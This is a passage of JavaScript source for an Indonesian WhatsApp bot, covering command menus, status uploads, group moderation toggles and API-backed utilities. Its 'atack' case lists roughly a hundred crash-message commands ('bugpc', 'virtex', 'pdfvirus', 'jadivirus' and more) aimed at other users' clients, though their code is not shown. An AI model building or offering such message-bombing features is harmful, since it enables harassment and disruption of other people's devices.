sendButLocation(from, `${menu}`,`𝘽𝙤𝙩 𝘽𝙮 @${dtod.split("@")[0]}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}command`,buttonText:{displayText:'𝙈𝙚𝙣𝙪 シ︎'},type:1},{buttonId:`${prefix}credit`,buttonText:{displayText:'𝙏𝙝𝙖𝙣𝙠𝙨 𝙏𝙤☻︎'},type:1},{buttonId:`${prefix}script`,buttonText:{displayText:'𝙎𝙘𝙧𝙞𝙥𝙩 シ︎'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'upswmenu':
groups = KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await KonX.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6285157160906@s.whatsapp.net"
        dtod = '6285157160906'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await KonX.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
✩ 𝗛𝗮𝗶 𝗞𝗮𝗸 @${sender.split("@")[0]}
│
│シ︎𝘜𝘱𝘴𝘸 𝘔𝘦𝘯𝘶シ︎
│
│🍃${prefix}upswteks teks
│
│🍃${prefix}upswvideo
│
│🍃${prefix}upswimage
│
│🍃${prefix}upswvoice
│
│🍃${prefix}upswsticker
│
│🍃${prefix}upswlokasi
│>─❒
`
sendButLocation(from, `${menu}`,`𝘽𝙤𝙩 𝘽𝙮 @${dtod.split("@")[0]}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}command`,buttonText:{displayText:'𝙈𝙚𝙣𝙪 シ︎'},type:1},{buttonId:`${prefix}credit`,buttonText:{displayText:'𝙏𝙝𝙖𝙣𝙠𝙨 𝙏𝙤☻︎'},type:1},{buttonId:`${prefix}store`,buttonText:{displayText:'𝙎𝙏𝙊𝙍𝙀 𝘽𝙊𝙏 🛒 シ︎'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'othermenu':
groups = KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await KonX.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6285157160906@s.whatsapp.net"
        dtod = '6285157160906'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await KonX.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
✩ 𝗛𝗮𝗶 𝗞𝗮𝗸 @${sender.split("@")[0]}
│
│シ︎𝘖𝘵𝘩𝘦𝘳 𝘔𝘦𝘯𝘶シ︎
│
│🍃${prefix}ping
│
│🍃${prefix}inspect
│
│🍃${prefix}join
│
│🍃${prefix}dadu
│
│🍃${prefix}bilangangka number
│
│🍃${prefix}kalkulator
│
│🍃${prefix}pantun
│
│🍃${prefix}quote
│
│🍃${prefix}nuliskanan teks
│
│🍃${prefix}nuliskiri teks
│
│🍃${prefix}foliokiri teks
│
│🍃${prefix}foliokanan teks
│
│🍃${prefix}ss link web
│
│🍃${prefix}liriklagu <query>
│
│🍃${prefix}artinama <name>
│
│🍃${prefix}debug
│
│🍃${prefix}loli 
│
│🍃${prefix}debug2
│
│🍃${prefix}infogempa
│
│🍃${prefix}resepmasakan
│
│🍃${prefix}chat 62|P
│
│🍃${prefix}caripesan <query>
│
│🍃${prefix}get url
│
│🍃${prefix}githubstalk <query>
│
│🍃${prefix}ytsearch <query>
│
│🍃${prefix}igstalk <query>
│
│🍃${prefix}tiktokstalk <query>
│
│🍃${prefix}play <query>
│
│🍃${prefix}video <query>
│
│🍃${prefix}igstory <username>
│
│🍃${prefix}twitter <link>
│
│🍃${prefix}tiktok <link>
│
│🍃${prefix}fb <link>
│
│🍃${prefix}brainly <query>
│
│🍃${prefix}image <query>
│
│🍃${prefix}anime <random>
│
│🍃${prefix}pinterest <query>
│
│🍃${prefix}komiku <query>
│
│🍃${prefix}lirik <query>
│
│🍃${prefix}chara <query>
│
│🍃${prefix}playstore <query>
│
│🍃${prefix}otaku <query>
│>─❒
`
sendButLocation(from, `${menu}`,`𝘽𝙤𝙩 𝘽𝙮 @${dtod.split("@")[0]}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}command`,buttonText:{displayText:'𝙈𝙚𝙣𝙪 シ︎'},type:1},{buttonId:`${prefix}credit`,buttonText:{displayText:'𝙏𝙝𝙖𝙣𝙠𝙨 𝙏𝙤☻︎'},type:1},{buttonId:`${prefix}store`,buttonText:{displayText:'𝙎𝙏𝙊𝙍𝙀 𝘽𝙊𝙏 🛒 シ︎'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'makermenu':
groups = KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await KonX.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6285157160906@s.whatsapp.net"
        dtod = '6285157160906'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await KonX.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
✩ 𝗛𝗮𝗶 𝗞𝗮𝗸 @${sender.split("@")[0]}
│
│シ︎𝘔𝘢𝘬𝘦𝘳 𝘔𝘦𝘯𝘶シ
│
│🍃${prefix}𝙨𝙩𝙞𝙘𝙠𝙚𝙧
│
│🍃${prefix}𝙨𝙬𝙢 <𝙖𝙪𝙩𝙝𝙤𝙧|𝙥𝙖𝙘𝙠𝙣𝙖𝙢𝙚>
│
│🍃${prefix}𝙩𝙖𝙠𝙚 <𝙖𝙪𝙩𝙝𝙤𝙧|𝙥𝙖𝙘𝙠𝙣𝙖𝙢𝙚>
│
│🍃${prefix}fdeface
│
│🍃${prefix}attp teks
│
│🍃${prefix}fancytext teks
│
│🍃${prefix}emoji
│
│🍃${prefix}halloween teks
│
│🍃${prefix}vampire teks
│
│🍃${prefix}codetxt teks
│
│🍃${prefix}matrix teks
│
│🍃${prefix}googletxt teks
│
│🍃${prefix}spiderman teks
│
│🍃${prefix}express
│
│🍃${prefix}maker2d2 teks
│
│🍃${prefix}maker2d3 teks
│
│🍃${prefix}maker2d4 teks
│
│🍃${prefix}maker3d teks
│
│🍃${prefix}golden teks
│
│🍃${prefix}flower teks
│
│🍃${prefix}dance
│
│🍃${prefix}wooden teks
│
│🍃${prefix}burn teks
│
│🍃${prefix}glow teks
│
│🍃${prefix}summer teks
│
│🍃${prefix}neon teks
│
│🍃${prefix}coffeecup2 teks
│
│🍃${prefix}coffeecup teks
│
│🍃${prefix}battlefield teks|teks
│
│🍃${prefix}googletxt2 teks
│
│🍃${prefix}transformer teks
│
│🍃${prefix}nulis teks
│
│🍃${prefix}text3d teks
│
│🍃${prefix}warrior teks
│>─❒
`
sendButLocation(from, `${menu}`,`𝘽𝙤𝙩 𝘽𝙮 @${dtod.split("@")[0]}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}command`,buttonText:{displayText:'𝙈𝙚𝙣𝙪 シ︎'},type:1},{buttonId:`${prefix}credit`,buttonText:{displayText:'𝙏𝙝𝙖𝙣𝙠𝙨 𝙏𝙤☻︎'},type:1},{buttonId:`${prefix}store`,buttonText:{displayText:'𝙎𝙏𝙊𝙍𝙀 𝘽𝙊𝙏 🛒 シ︎'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'domainsake':
				case 'createdomainseke':
				case 'buatdomainse.ke':
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
				if (args.length < 1) return reply(`format salah ,contoh : ${prefix}createdomainseke namadomain|ns1|ns2`)
                                 gett_args = args.join(" ").split("|")
                    domainn = gett_args[0]
                     ns1 = gett_args[1]    
                     ns2 = gett_args[2]                       
				KonX.updatePresence(from, Presence.composing) 
				reply(mess.wait)
				dataa = await fetchJson(`https://cheatergamingstore.com/CheaterGaming/seke.php?domain=${domainn}&ns1=${ns1}&ns2=${ns2}`)
			    xnxxc = (`${dataa.status}`)
			    if (xnxxc == "error" ) return reply(`yah emror broh :( `)
				hasill = `sucess buat \n ini hasil nya kak:)\nOutput : ${dataa.domain} \n Subscribe Yt Naufal tutor`
				reply(hasill)
				await (sender)
				break
case 'atack':
groups = KonX.chats.array.filter(v => v.jid.endsWith('g.us'))
              privat = KonX.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
              ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
           
              uptime = process.uptime();
              timestampe = speed();
              totalChat = await KonX.chats.all()
              latensie = speed() - timestampe
              total = math(`${groups.length}*${privat.length}`)
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fkontak})
        ptod = "6285157160906@s.whatsapp.net"
        dtod = '6285157160906'
        stod = `${sender}`
        uwuu = '```'
        yoii = '*'
       stst = await KonX.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `
✩ 𝗛𝗮𝗶 𝗞𝗮𝗸 @${sender.split("@")[0]}
│
│シ︎ATACKシ︎
│
│⿻️ ${prefix}xbug*
│⿻️ ${prefix}bugpc*
│⿻️ ${prefix}bugpc2*
│⿻️ ${prefix}bugbrutal*
│⿻️ ${prefix}bugaja <jumlah>*
│⿻️ ${prefix}bugv2 <jumlah>*
│⿻️ ${prefix}buggc <jumlah>*
│⿻️ ${prefix}sendbug <jumlah>*
│⿻️ ${prefix}bugtext <jumlah>*
│⿻️ ${prefix}bugstik*
│⿻️ ${prefix}bugpdf*
│⿻️ ${prefix}bugdoc*
│⿻️ ${prefix}sendallvirtex*
│⿻️ ${prefix}katalog*
│⿻️ ${prefix}katalogv2*
│⿻️ ${prefix}katalogv3*
│⿻️ ${prefix}jadi <teks> <tag gambar>*
│⿻️ ${prefix}bugcombine*
│⿻️ ${prefix}buglokasi*
│⿻️ ${prefix}buglokasiv2*
│⿻️ ${prefix}bugimg*
│⿻️ ${prefix}bugimgv2*
│⿻️ ${prefix}bugimgv3*
│⿻️ ${prefix}bugr*
│⿻️ ${prefix}bughole*
│⿻️ ${prefix}allbuglokasi*
│⿻️ ${prefix}bugtroli*
│⿻️ ${prefix}troli*
│⿻️ ${prefix}troliv2*
│⿻️ ${prefix}bugweb <teks>*
│⿻️ ${prefix}buglociphone*
│⿻️ ${prefix}buglink*
│⿻️ ${prefix}bugdisw*
│⿻️ ${prefix}superhole*
│⿻️ ${prefix}buglist*
│⿻️ ${prefix}bugvn*
│⿻️ ${prefix}ranzdgx*
│⿻️ ${prefix}lockhole*
│⿻️ ${prefix}autohole (total)*
│⿻️ ${prefix}philips (total)*
│⿻️ ${prefix}buggif*
│⿻️ ${prefix}bugbuttonv2*
│⿻️ ${prefix}vdgx*
│⿻️ ${prefix}sendbugv2*
│⿻️ ${prefix}bugarawareal*
│⿻️ ${prefix}bugfake (Jumlah)*
│⿻️ ${prefix}jadivirus (reply)
│⿻️ ${prefix}bugbutton*
│⿻️ ${prefix}virtag*
│⿻️ ${prefix}bugkontak*
│⿻️ ${prefix}bugaudio*
│⿻️ ${prefix}bugtrolilist*
│⿻️ ${prefix}vstick*
│⿻️ ${prefix}vstick2*
│⿻️ ${prefix}vstick3*
│⿻️ ${prefix}bgc*
│⿻️ ${prefix}bugvn2*
│⿻️ ${prefix}bugdokumen*
│⿻️ ${prefix}bugdokumenv2*
│⿻️ ${prefix}bugsil*
│⿻️ ${prefix}bggg*
│⿻️ ${prefix}kk*
│⿻️ ${prefix}buglocandro (teks)*
│⿻️ ${prefix}bugliveloc*
│⿻️ ${prefix}v*
│⿻️ ${prefix}bugbuttonv3*
│⿻️ ${prefix}bugbuttonv4*
│⿻️ ${prefix}lawack*
│⿻️ ${prefix}bugsw (reply gmbr)
│⿻️ ${prefix}jadivirvid (reply video)*
│⿻️ ${prefix}bugvideo*
│⿻️ ${prefix}ranzmanju*
│⿻️ ${prefix}bugarawa*
│⿻️ ${prefix}bugarawaza*
│⿻️ ${prefix}pdfvirus*
│⿻️ ${prefix}pdfvirusreal*
│⿻️ ${prefix}virustext (teks)*
│⿻️ ${prefix}hen*
│⿻️ ${prefix}bugvideov2*
│⿻️ ${prefix}spamvirtex「Total」*
│⿻️ ${prefix}virustextv2「teks」*
│⿻️ ${prefix}bugimgv4*
│⿻️ ${prefix}jadiv3「teks」「tag gambar」*
│⿻️ ${prefix}jadiv4「teks」「tag gambar」*
│⿻️ ${prefix}jadiv5「teks」「tag gambar」*
│⿻️ ${prefix}bugnulis「teks」*
│⿻️ ${prefix}virlok「teks」*
│⿻️ ${prefix}bugwebv2「teks」*
│⿻️ ${prefix}bugneon「teks」*
│⿻️ ${prefix}buggifv2*
│⿻️ ${prefix}buginvite*
│⿻️ ${prefix}jadiphilips [teks] [tag gambar]*
│⿻️ ${prefix}jadiphilipsv2 [teks] [tag Sticker]*
│⿻️ ${prefix}jadibugpdf [teks] [tag gambar]*
│⿻️ ${prefix}jadibugpdfv2 [teks] [tag Sticker]*
│⿻️ ${prefix}jadibugjson [teks] [tag Gambar]*
│⿻️ ${prefix}jadibugjsonv2 [teks] [tag Sticker]*
│⿻️ ${prefix}jadibugjs [teks] [tag Gambar]*
│⿻️ ${prefix}jadibugjsv2 [teks] [tag Sticker]*
│⿻️ ${prefix}jadibugxml [teks] [tag Gambar]*
│⿻️ ${prefix}jadibugxmlv2 [teks] [tag Sticker]*
│⿻️ ${prefix}jadibugzip [teks] [tag Gambar]*
│⿻️ ${prefix}jadibugzipv2 [teks] [tag Sticker]*
│⿻️ ${prefix}jadibug7z [teks] [tag Gambar]*
│⿻️ ${prefix}jadibug7zv2 [teks] [tag Sticker]*
│⿻️ ${prefix}jadibugvideo [tag Video]*
│⿻️ ${prefix}jadibugaudio [tag Audio]*
│>─❒
`
sendButLocation(from, `${menu}`,`𝘽𝙤𝙩 𝘽𝙮 @${dtod.split("@")[0]}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}command`,buttonText:{displayText:'𝙈𝙚𝙣𝙪 シ︎'},type:1},{buttonId:`${prefix}credit`,buttonText:{displayText:'𝙏𝙝𝙖𝙣𝙠𝙨 𝙏𝙤☻︎'},type:1},{buttonId:`${prefix}store`,buttonText:{displayText:'𝙎𝙏𝙊𝙍𝙀 𝘽𝙊𝙏 🛒 シ︎'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})

break
case 'katalog':
      list = await KonX.prepareMessageFromContent(from, {
    "listMessage": {
      "title": "PAYMENT",
      "description": "CLICK",
      "buttonText": "",
      "listType": "PRODUCT_LIST",
      "productListInfo": {
        "productSections": [
          {
            "title": "LIST CATALOG",
            "products": [
              {
                "productId": "4120139628109348"
              },
              {
              	"productId": "6431678466857362"
              },
              {
              	"productId": "4392524570816732"
              }
            ]
          }
        ],
        "headerImage": {
          "productId": "4120139628109348",
          "jpegThumbnail": iye
        },
        "businessOwnerJid": sender
      },
      "footerText": " List Items Bot︎"
    }
  }, {quoted: freply})
  KonX.relayWAMessage(list, {waitForAck: true})
       
case 'triggered':
                
                if (isImage || isQuotedImage) {
                    let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
                    let media = await KonX.downloadAndSaveMediaMessage(encmedia)
                    var tolink = await uptotele(media)
                let ane = await getBuffer(`https://some-random-api.ml/canvas/triggered?avatar=${tolink}`)
                fs.writeFileSync('./sticker/triggered.webp', ane)
                exec(`webpmux -set exif ./sticker/data.exif ./sticker/triggered.webp -o ./sticker/triggered.webp`, async (error) => {
                    if (error) return reply(mess.error.api)
                    KonX.sendMessage(from, fs.readFileSync(`./sticker/triggered.webp`), sticker, {quoted: freply})
                    
                    fs.unlinkSync(`./sticker/triggered.webp`)	
                })
                }
            
                break
  break
  case 'pantun':
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/pantun?apikey=${HunterApi}`, {method: 'get'})
				kata = anu.result
				reply(kata)
				break
case 'script':
		case 'sc':
		case 'sourcecode':
		KonX.sendMessage(from, { text: "Subscribe dulu yt owner gua : Naufal tutor\nnah terus ketik Scbot 🗿🛐", matchedText: 'nopee', description: "", title: "Ngapain Om?", jpegThumbnail: iye }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: finv})
		break
		case 'bot':
		case 'b':
		KonX.sendMessage(from, { text: "Hallo apa kabar?", matchedText: 'nopee', description: "", title: "Ngapain Om?", jpegThumbnail: iye }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: finv})
		break
		case 'nonaufal':
		case 'naufal':
		KonX.sendMessage(from, { text: "nih no Naufal : http://wa.me/6285157160906", matchedText: 'nopee', description: "", title: "Ngapain Om?", jpegThumbnail: iye }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: finv})
		break
		case 'noakmal':
		case 'akmal':
		KonX.sendMessage(from, { text: "nih no Akmal : wa.me/6281212083401", matchedText: 'nopee', description: "", title: "Ngapain Om?", jpegThumbnail: iye }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: finv})
		break
		case 'noridho':
		case 'ridho':
		KonX.sendMessage(from, { text: "nih no Ridho : http://wa.me/6287721317870", matchedText: 'nopee', description: "", title: "Ngapain Om?", jpegThumbnail: iye }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: finv})
		break
		case 'grup':
		case 'grupbot':
		KonX.sendMessage(from, { text: "*NOH GROUP² BOT/OWNER* : \n1. https://chat.whatsapp.com/CN0b6MId8jlJeyBs0SmS7Y\n2. https://chat.whatsapp.com/JEBPQ1TrM8bH4KG7BDvEGu\n3. https://chat.whatsapp.com/KzmixIsPkRQ9Z7IH10klH4", matchedText: 'nopee', description: "", title: "Ngapain Om?", jpegThumbnail: iye }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: finv})
		break
		case 'scbot':
		case 'scini':
		KonX.sendMessage(from, { text: "nih gua public in>3🗿 https://github.com/naufal132/AkmalV1", matchedText: 'nopee', description: "", title: "Ngapain Om?", jpegThumbnail: iye }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: finv})
		break
		case 'github':
		case 'githubown':
		KonX.sendMessage(from, { text: "Nih gua kasih github owner gua https://github.com/naufal132", matchedText: 'nopee', description: "", title: "Ngapain Om?", jpegThumbnail: iye }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: finv})
		break
		case 'yt':
		case 'ytown':
		KonX.sendMessage(from, { text: "nih link yt owner gua\n*LINK* : https://bit.ly/YtNaufal\n*NAMA* : Naufal tutor", matchedText: 'nopee', description: "", title: "Ngapain Om?", jpegThumbnail: iye }, 'extendedTextMessage', { detectLinks: false, contextInfo: { forwardingScore: 508, isForwarded: true}, quoted: finv})
		break
      //------------------< Sticker Cmd >-------------------
      case "addcmd":
      case "setcmd":
        if (isQuotedSticker) {
          if (!q)
            return reply(`Penggunaan : ${command} cmdnya dan tag stickernya`);
          var kodenya =
            mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString(
              "base64"
            );
          addCmd(kodenya, q);
          fakestatus("Done!");
        } else {
          reply("tag stickenya");
        }
        break;
	case 'upswteks':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(10)
                    KonX.sendMessage('status@broadcast', teks, MessageType.text)
                    reply(`Sukses upload status:\n${teks}`)
                    break	
                    case 'upswlokasi':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
  if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(12)
                    KonX.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`${fakeyoi}`}, MessageType.location)
                    reply(`Sukses upload lokasi:\n${teks}`)
                    break	
                    case 'upswsticker':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!isQuotedSticker) return reply('Reply stikernya!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await KonX.downloadMediaMessage(encmedia)
						KonX.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Sukses upload sticker`)
                    break
                     case 'upswaudio':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await KonX.downloadMediaMessage(encmedia)
						KonX.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
						reply(`Sukses upload audio`)
						break
						case 'upswvoice':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await KonX.downloadMediaMessage(encmedia)
						KonX.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
						reply(`Sukses upload voice`)
						break
case 'upswvideo':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                    var konti = body.slice(11)
                    reply(mess.wait)
                    var enmediap = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					var mediap = await KonX.downloadAndSaveMediaMessage(enmediap)
                    const buffer3 = fs.readFileSync(mediap)
                    KonX.sendMessage('status@broadcast', buffer3, MessageType.video, {duration: 359996400, caption: `${konti}`})
                    reply(`Sukses upload video:\n${konti}`)
                        break
                           case 'upswgif':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                    var konti = body.slice(7)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await KonX.downloadAndSaveMediaMessage(enmedia)
                    const buffer6 = fs.readFileSync(media)
                    KonX.sendMessage('status@broadcast', buffer6, MessageType.video, {mimetype : 'video/gif', caption: `${konti}`})
                    reply(`Sukses upload gif:\n${konti}`)
                        break
                        case 'upswimage':
                        if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                    var teksyy = body.slice(11)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await KonX.downloadAndSaveMediaMessage(enmedia)
                    buffer = fs.readFileSync(media)
                    KonX.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: mek, caption: `${teksyy}`})
                    reply(`Sukses upload image:\n${teksyy}`)
                        break
					case 'shutdown':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
				return KonX.sendMessage(from, JSON.stringify(eval(process.exit())))
				reply('Okey')
				break
      case "delcmd":
        if (!isQuotedSticker)
          return reply(`Penggunaan : ${command} tagsticker`);
        var kodenya =
          mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.fileSha256.toString(
            "base64"
          );
        _scommand.splice(getCommandPosition(kodenya), 1);
        fs.writeFileSync("./database/scommand.json", JSON.stringify(_scommand));
        fakestatus("Done!");
        break;
      case "listcmd":
        teksnyee = `\`\`\`「 LIST STICKER CMD 」\`\`\``;
        cemde = [];
        for (let i of _scommand) {
          cemde.push(i.id);
          teksnyee += `\n\n➸ *ID :* ${i.id}\n➸ *Cmd* : ${i.chats}`;
        }
        mentions(teksnyee, cemde, true);
        break;
        // banchat fixed by KonX
case 'banchat':
if (!isGroup) return reply(mess.only.group)
if (!itsMe && !isOwner && !isGroupAdmins)return mentions(`*Perintah ini Khusus @${ownerN} !*`, [`${ownerN}@s.whatsapp.net`], true)
//if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (isBanchat) return reply(`udah di ban`)
bancht.push(from)
fs.writeFileSync('./database/banchat.json', JSON.stringify(bancht))
reply(`Bot berhasil Ban di group ini`)
break

case 'unbanchat':
if (!itsMe && !isOwner)return reply(mess.only.ownerB)
if (!isBanchat) return reply(`udah di UnBan`)
let ubc = bancht.indexOf(from)
bancht.splice(ubc, 1)
fs.writeFileSync('./database/banchat.json', JSON.stringify(bancht))
reply(`Bot telah di Unban di group ini`)
break

case 'listbanchat': case 'listbc':
 teks = `*List Banchat Group!*\n_Total : ${bancht.length}_\n\n`
for(let i of bancht){
met = await KonX.groupMetadata(i)
teks += 'Id : ' + i + '\n'
teks += 'Nama Group : ' + met.subject + '\n\n'
}
reply(teks)
break
      case "antilink":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntilink) return reply("Sudah aktif!!");
          antilink.push(from);
          fs.writeFileSync(
            "./database/antilink.json",
            JSON.stringify(antilink)
          );
          reply("Sukses mengaktifkan antilink!");
        } else if (args[0] == "off") {
          antilink.splice(from, 1);
          fs.writeFileSync(
            "./database/antilink.json",
            JSON.stringify(antilink)
          );
          reply("Sukses mematikan antilink!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTILINK`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}antilink on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antilink off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "antihidetag":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntihidetag) return reply("Sudah aktif!!");
          antihidetg.push(from);
          fs.writeFileSync(
            "./database/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("Sukses mengaktifkan antihidetag!");
        } else if (args[0] == "off") {
          antihidetg.splice(from, 1);
          fs.writeFileSync(
            "./database/antihidetag.json",
            JSON.stringify(antihidetg)
          );
          reply("Sukses mematikan antihidetag!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTIHIDETAG`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antihidetag on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antihidetag off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
      case "antiviewonce":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntiviewonce) return reply("Sudah aktif!!");
          antivo.push(from);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          reply("Sukses mengaktifkan antiviewonce!");
        } else if (args[0] == "off") {
          antivo.splice(from, 1);
          fs.writeFileSync("./database/antivo.json", JSON.stringify(antivo));
          reply("Sukses mematikan antiviewonce!");
        } else if (!q) {
          sendButMessage(
            from,
            `MODE ANTIVIEWONCE`,
            `Silahkan pilih salah satu`,
            [
              {
                buttonId: `${prefix}antiviewonce on`,
                buttonText: {
                  displayText: `on`,
                },
                type: 1,
              },
              {
                buttonId: `${prefix}antiviewonce off`,
                buttonText: {
                  displayText: `off`,
                },
                type: 1,
              },
            ]
          );
        }
        break;
       case 'autoketik':
if (!isOwner && !mek.key.fromMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if (autoketik === true) return
autoketik = true
reply(`Succes mengaktifkan autoketik`)
} else if (args[0] === "off") {
if (autoketik === false) return
autoketik = false
reply(`Succes mematikan autoketik`)
} else {
reply(`Pilih on atau off`)
}
break
case 'autovn':
if (!isOwner && !mek.key.fromMe) return
if (args.length < 1) return reply('Pilih on atau off')
if (args[0] === "on") {
if (autovn === true) return
autovn = true
reply(`Succes mengaktifkan autovn`)
